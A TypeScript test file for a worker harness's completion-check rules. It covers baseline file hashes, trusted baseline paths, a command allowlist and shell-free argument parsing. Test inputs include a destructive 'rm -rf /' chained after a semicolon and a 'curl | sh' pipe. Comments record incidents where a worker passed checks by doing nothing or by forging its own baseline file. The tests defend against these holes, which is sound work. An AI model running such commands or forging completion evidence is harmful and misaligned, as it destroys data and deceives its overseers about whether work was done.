import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import {
  evaluateDoneWhenRule,
  parseRunArgv,
  partitionDoneWhen,
  SLICE_BASELINE_SCHEMA,
  writeBaselineHashes,
  type SliceBaselineHashes,
} from "./done-when-rules.js";

function tmpTree(prefix: string): string {
  return mkdtempSync(path.join(tmpdir(), prefix));
}

function writeBaseline(
  baselineDir: string,
  partial: Partial<SliceBaselineHashes> & { files: Record<string, string>; targets: string[] },
): void {
  mkdirSync(baselineDir, { recursive: true });
  const record: SliceBaselineHashes = {
    schemaVersion: SLICE_BASELINE_SCHEMA,
    sliceId: partial.sliceId ?? "slice-x",
    recordedAt: partial.recordedAt ?? new Date().toISOString(),
    treeRoot: partial.treeRoot ?? "/tree",
    targets: partial.targets,
    files: partial.files,
  };
  writeFileSync(path.join(baselineDir, "baseline-hashes.json"), JSON.stringify(record));
}

describe("changed: fail-closed baseline (H1)", () => {
  it("FAILS when no baseline file exists — the old fail-open hole", async () => {
    // INCIDENT: nothing ever wrote baseline-hashes.json; absent baseline became {} and every
    // target counted as "changed". A worker satisfied the rule by doing nothing.
    const tree = tmpTree("dw-no-baseline-");
    writeFileSync(path.join(tree, "tracked.ts"), "content\n");
    const check = await evaluateDoneWhenRule(tree, "changed:tracked.ts", "slice-x", {});
    expect(check.passed).toBe(false);
    expect(check.detail).toMatch(/no baseline recorded/);
  });

  it("FAILS when current sha256 matches the baseline (unchanged)", async () => {
    const tree = tmpTree("dw-unchanged-");
    const body = "same-content\n";
    writeFileSync(path.join(tree, "tracked.ts"), body);
    const hash = createHash("sha256").update(body).digest("hex");
    const baselineDir = path.join(tree, ".trusted");
    writeBaseline(baselineDir, {
      targets: ["changed:tracked.ts"],
      files: { "tracked.ts": hash },
    });
    const check = await evaluateDoneWhenRule(tree, "changed:tracked.ts", "slice-x", {}, { baselineDir });
    expect(check.passed).toBe(false);
    expect(check.detail).toMatch(/unchanged since slice baseline/);
  });

  it("PASSES when the file is absent from baseline.files (worker created it)", async () => {
    // Getting this right is the difference between a working rule and one that bans new files.
    // The baseline RECORD exists and explicitly did not contain the path → unambiguous create.
    const tree = tmpTree("dw-new-file-");
    writeFileSync(path.join(tree, "brand-new.ts"), "created by worker\n");
    const baselineDir = path.join(tree, ".trusted");
    writeBaseline(baselineDir, {
      targets: ["changed:brand-new.ts"],
      files: {}, // empty files map is legal
    });
    const check = await evaluateDoneWhenRule(tree, "changed:brand-new.ts", "slice-x", {}, { baselineDir });
    expect(check.passed).toBe(true);
    expect(check.detail).toMatch(/changed during this slice/);
  });

  it("FAILS on corrupt / unparseable baseline JSON", async () => {
    const tree = tmpTree("dw-corrupt-");
    writeFileSync(path.join(tree, "tracked.ts"), "x\n");
    const baselineDir = path.join(tree, ".trusted");
    mkdirSync(baselineDir, { recursive: true });
    writeFileSync(path.join(baselineDir, "baseline-hashes.json"), "{ not json");
    const check = await evaluateDoneWhenRule(tree, "changed:tracked.ts", "slice-x", {}, { baselineDir });
    expect(check.passed).toBe(false);
    expect(check.detail).toMatch(/unparseable/);
  });

  it("FAILS when the rule is not listed in baseline.targets (stale rule set)", async () => {
    const tree = tmpTree("dw-stale-targets-");
    writeFileSync(path.join(tree, "tracked.ts"), "x\n");
    const baselineDir = path.join(tree, ".trusted");
    writeBaseline(baselineDir, {
      targets: ["changed:other.ts"], // different rule
      files: {},
    });
    const check = await evaluateDoneWhenRule(tree, "changed:tracked.ts", "slice-x", {}, { baselineDir });
    expect(check.passed).toBe(false);
    expect(check.detail).toMatch(/targets does not include/);
  });
});

describe("changed: baselineDir trust split (H2)", () => {
  it("uses the TRUSTED baselineDir and ignores a forged baseline in the tree under test", async () => {
    // INCIDENT: baseline path was derived from the same root as the targets. A worktree-bound
    // worker could write its own baseline-hashes.json and pass every changed: rule.
    const tree = tmpTree("dw-forged-");
    const body = "worker-content\n";
    writeFileSync(path.join(tree, "tracked.ts"), body);
    const hash = createHash("sha256").update(body).digest("hex");

    // Forged baseline in the worktree: claims the file was empty before (would make any content "changed").
    const forgedDir = path.join(tree, ".openclinxr", "slices", "slice-x");
    writeBaseline(forgedDir, {
      targets: ["changed:tracked.ts"],
      files: { "tracked.ts": "deadbeef" }, // different hash → would PASS if trusted
    });

    // Trusted baseline: records the current hash (file unchanged) → must FAIL.
    const trustedDir = tmpTree("dw-trusted-baseline-");
    writeBaseline(trustedDir, {
      targets: ["changed:tracked.ts"],
      files: { "tracked.ts": hash },
    });

    const check = await evaluateDoneWhenRule(
      tree,
      "changed:tracked.ts",
      "slice-x",
      {},
      { baselineDir: trustedDir },
    );
    expect(check.passed).toBe(false);
    expect(check.detail).toMatch(/unchanged since slice baseline/);
  });
});

describe("parseRunArgv — no shell (H3)", () => {
  it("rejects a command with semicolon and names the character", () => {
    const result = parseRunArgv("pnpm test; rm -rf /");
    expect("error" in result).toBe(true);
    if ("error" in result) expect(result.error).toMatch(/;/);
  });

  it("rejects a pipe (and the non-allowlisted binary if metachar were stripped first)", () => {
    // Metacharacter check runs first — pipe is the fail reason for shell injection.
    const pipe = parseRunArgv("curl http://x | sh");
    expect("error" in pipe).toBe(true);
    if ("error" in pipe) expect(pipe.error).toMatch(/\|/);

    // Binary allowlist independently rejects curl when no metachar is present.
    const curl = parseRunArgv("curl http://x");
    expect("error" in curl).toBe(true);
    if ("error" in curl) expect(curl.error).toMatch(/curl/);
  });

  it("preserves quoted test names as a single argv element", () => {
    const result = parseRunArgv('pnpm --filter x test -- -t "a name"');
    expect("argv" in result).toBe(true);
    if ("argv" in result) {
      expect(result.argv).toEqual(["pnpm", "--filter", "x", "test", "--", "-t", "a name"]);
      expect(result.argv).toHaveLength(7);
    }
  });
});

describe("run: allowlist + fail-closed execution", () => {
  it("FAILS without executing a non-allowlisted binary", async () => {
    const check = await evaluateDoneWhenRule(
      process.cwd(),
      "run:curl http://example.invalid",
      "slice-x",
      {},
    );
    expect(check.passed).toBe(false);
    expect(check.detail).toMatch(/not allowlisted|curl/);
  });

  it("FAILS closed when an allowlisted command exits non-zero", async () => {
    // node -e "process.exit(1)" is allowlisted and genuinely fails.
    const check = await evaluateDoneWhenRule(
      process.cwd(),
      'run:node -e "process.exit(1)"',
      "slice-x",
      {},
    );
    expect(check.passed).toBe(false);
    expect(check.detail).toMatch(/failed/);
  });

  it("PASSES when an allowlisted command exits zero", async () => {
    const check = await evaluateDoneWhenRule(
      process.cwd(),
      'run:node -e "process.exit(0)"',
      "slice-x",
      {},
    );
    expect(check.passed).toBe(true);
  });
});

describe("partitionDoneWhen", () => {
  it("puts handoff/skeptic/handoffs:all-done in narrative, never treeProofs", () => {
    const rules = [
      "exists:foo",
      "min-bytes:foo:10",
      "run:pnpm test",
      "changed:src/**",
      "live:src/a.test.ts",
      "handoff:asset-pipeline-lead:done",
      "skeptic:visible",
      "handoffs:all-done",
      "sole-author:oops",
    ];
    const { treeProofs, narrative, unknown } = partitionDoneWhen(rules);
    expect(treeProofs).toEqual([
      "exists:foo",
      "min-bytes:foo:10",
      "run:pnpm test",
      "changed:src/**",
      "live:src/a.test.ts",
    ]);
    expect(narrative).toEqual([
      "handoff:asset-pipeline-lead:done",
      "skeptic:visible",
      "handoffs:all-done",
    ]);
    expect(unknown).toEqual(["sole-author:oops"]);
    // Narrative must never appear in treeProofs (merge gate).
    for (const n of narrative) {
      expect(treeProofs).not.toContain(n);
    }
  });
});

describe("writeBaselineHashes", () => {
  it("records v1 schema with targets and current file hashes", async () => {
    const tree = tmpTree("dw-write-baseline-");
    writeFileSync(path.join(tree, "a.ts"), "alpha\n");
    const baselineDir = path.join(tree, ".trusted");
    const result = await writeBaselineHashes({
      treeRoot: tree,
      baselineDir,
      sliceId: "s1",
      rules: ["changed:a.ts", "exists:a.ts", "handoff:x:done"],
    });
    expect(result.targets).toEqual(["changed:a.ts"]);
    expect(result.fileCount).toBe(1);
    const written = JSON.parse(readFileSync(result.path, "utf8")) as SliceBaselineHashes;
    expect(written.schemaVersion).toBe(SLICE_BASELINE_SCHEMA);
    expect(written.targets).toEqual(["changed:a.ts"]);
    expect(written.files["a.ts"]).toMatch(/^[a-f0-9]{64}$/);
  });
});
